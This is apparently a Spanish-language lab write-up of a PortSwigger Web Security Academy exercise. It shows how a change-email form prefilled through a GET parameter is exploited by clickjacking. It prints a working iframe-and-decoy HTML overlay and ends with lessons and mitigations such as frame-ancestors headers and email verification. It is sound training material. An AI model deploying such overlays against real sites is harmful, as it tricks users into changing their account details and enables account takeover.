---
title: "Clickjacking with form input data prefilled from a URL parameter"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "web-security-academy.net"
slug: "clickjacking-with-form-input-data-prefilled-from-a-url-parameter"
author: "Z4k7"
date: "2026-11-15"
year: "2026"
status: "pwned"
tags:
  - "Clickjacking"
  - "GETParameter"
  - "Web"
  - "UI_Redressing"
  - "target_website"
  - "decoy_website"
  - "fff"
techniques:
  - "Clickjacking"
  - "prefilled form via GET parameter"
  - "iframe overlay"
tools:
  - "Exploit Server PortSwigger"
  - "Browser DevTools"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy (Web Application, Easy) que amplía el clickjacking básico ([[Clickjacking básico con protección mediante token CSRF]]). El formulario de cambio de correo (/my-account/change-email) acepta el valor por parámetro GET (?email=), lo que permite precargarlo en la URL del iframe sin que la víctima escriba nada. El overlay reduce la interacción de la víctima a un solo clic sobre el botón 'Update email' ya precargado con el correo del atacante.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio amplía el ejemplo básico de clickjacking del Laboratorio: Clickjacking básico con protección mediante token CSRF. El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario rellenando previamente un formulario mediante un parámetro de URL e incitándolo a hacer clic inadvertidamente en un botón de "Actualizar correo electrónico".
          Para resolver el laboratorio, crea un código HTML que enmarque la página de la cuenta y engañe al usuario para que actualice su dirección de correo electrónico haciendo clic en un botón de "Haz clic aquí". El laboratorio se resuelve cuando se cambia la dirección de correo electrónico.
          Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales:`wiener:peter`

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          ingresamos en el laboratorio podemos validar que contamos con un login ingresamos con los datos suministrados en el objetivo.
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025170248737.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          una vez ya contamos con el acceso en la web validamos el entorno del usuario
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025170323611.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con un dashboard el cual nos permite realizar modificaciones en el perfil de usuario en el apartado del Email podemos ingresar un correo electrónico y poder aplicar cambio al momento de dar un click en el botón de Update email en este caso el objetivo es tratar de aplicar el cabio del correo de la victima entramos a validar el código fuente de la web para tratar de validar como modificar o aplicar un nuevo correo en el formulario sin  que el usuario deba ingresarlo manualmente.
      - kind: "code"
        lang: "HTML"
        code: |
          <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
      - kind: "note"
        text: |
          En el anterior código podemos validar que contamos con  una ruta la cual nos permite realizar el cambio del correo electrónico
          consultando el comportamiento de la solicitud de valida que estaría tomando del formulario el email y el csrf.
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025172001908.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          podríamos tratar de ingresar desde la url principal el email de el formulario para tratar de auto rellenar el formulario
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025172254047.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          se confirma que si es posible ingresar un correo  electrónico desde la propia url
          aplicamos el mismo código html que utilizamos en el laboratorio  [[Clickjacking básico con protección mediante token CSRF]] en este caso para que funcione correctamente es necesario envía solo el email se debe retirar el id del usuario de la propia URL .
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este patrón aparece mucho más allá de clickjacking: cualquier formulario que acepte sus valores por GET es, de por sí, una superficie de CSRF (un atacante puede construir un link malicioso con los parámetros ya puestos) y aquí además habilita un overlay sin necesidad de que la víctima escriba nada. Detéctalo revisando el `action` y el `method` del formulario, y probando si cambiar el valor desde la URL cambia lo que se precarga."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Procedemos con el llamado de la web por medio del apartado de iframe este código lo ingresamos atreves del apartado del servido adicionamos por el entorno  del laboratorio.
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025172607766.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ingresamos en el `servidor` y manipulamos el entorno  `Body:`
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025172634889.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          código
      - kind: "code"
        lang: "HTML"
        code: |
          <head>
          	<style>
          		#target_website {
          			position:relative;
          			width:1570px;
          			height:700px;
          			opacity:1;
          			z-index:2;
          			}
          		#decoy_website {
          			position: absolute;
          			top: 527px;
          			left: 218px;
          			width: 110px;
          			z-index: 1;
          			border-radius: 25px;
          			-webkit-user-select: none;
          			background-color: #159c80;
          			color: #fff;
          			font-size: 16px;
          			font-weight: bold;
          			padding: 7px 1em;
          			text-align: center;
          			min-width: 120px;
          			}
          	</style>
          </head>
          <body>
          <div id="decoy_website">CLICK ME</div>
          	<iframe id="target_website" src="https://">
          	</iframe>
          </body>
      - kind: "note"
        text: |
          Guardamos el codigo en el servidor e ingresamos en View exploit para validar su entorno y comportamiento antes de enviar el exploit a la victima .
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025173726966.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          enviamos el exploit a la victima  y contamos con un resultado de ok
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025173832796.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/file-20261025173913250.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Alternativas y detalles a tener en cuenta: - No registrar un correo ya usado por otro usuario del laboratorio al probar tu propio exploit — usa una dirección distinta a la que enviarás a la víctima final, como advierte el propio objetivo del lab. - Combinar con el bypass de frame buster ([[Clickjacking with a frame buster script]]) cuando la página objetivo también detecta el framing con JavaScript — las dos técnicas no son excluyentes. - Probar Burp Clickbandit para automatizar el cálculo del overlay en vez de medir manualmente con DevTools."

lessons:
  - 'Un formulario que acepta sus valores por parámetro GET se puede precargar desde la URL del iframe, lo que reduce el ataque de clickjacking a un solo clic sin interacción adicional de la víctima.'
  - 'El `action` y el `method` del formulario en el código fuente revelan de inmediato si la ruta de envío existe y qué verbo HTTP usa.'
  - 'Confirmar la vulnerabilidad es tan simple como cambiar el parámetro en la URL y observar si el campo del formulario cambia en consecuencia.'
  - 'El mismo código HTML del overlay (iframe + señuelo) se reutiliza entre labs de clickjacking; lo que cambia es la URL objetivo y, aquí, el parámetro GET.'
  - 'Hay que usar un correo distinto al de las propias pruebas cuando se envía el exploit final a la víctima, porque el sistema no permite un correo duplicado.'
mitigation:
  - 'No permitir que acciones que modifican datos sensibles (como el correo de la cuenta) acepten sus valores por parámetros GET; usar solo el cuerpo de peticiones POST.'
  - 'Aplicar los mismos controles anti-framing que en el clickjacking básico: `X-Frame-Options` o, preferiblemente, `Content-Security-Policy: frame-ancestors`.'
  - 'Exigir confirmación por correo electrónico (verificación del nuevo correo) antes de aplicar el cambio, de forma que un clic accidental no complete la toma de la cuenta.'
  - 'No incluir tokens, correos ni otros datos sensibles como parámetros de URL, ya que además quedan expuestos en logs y en el historial del navegador.'
---
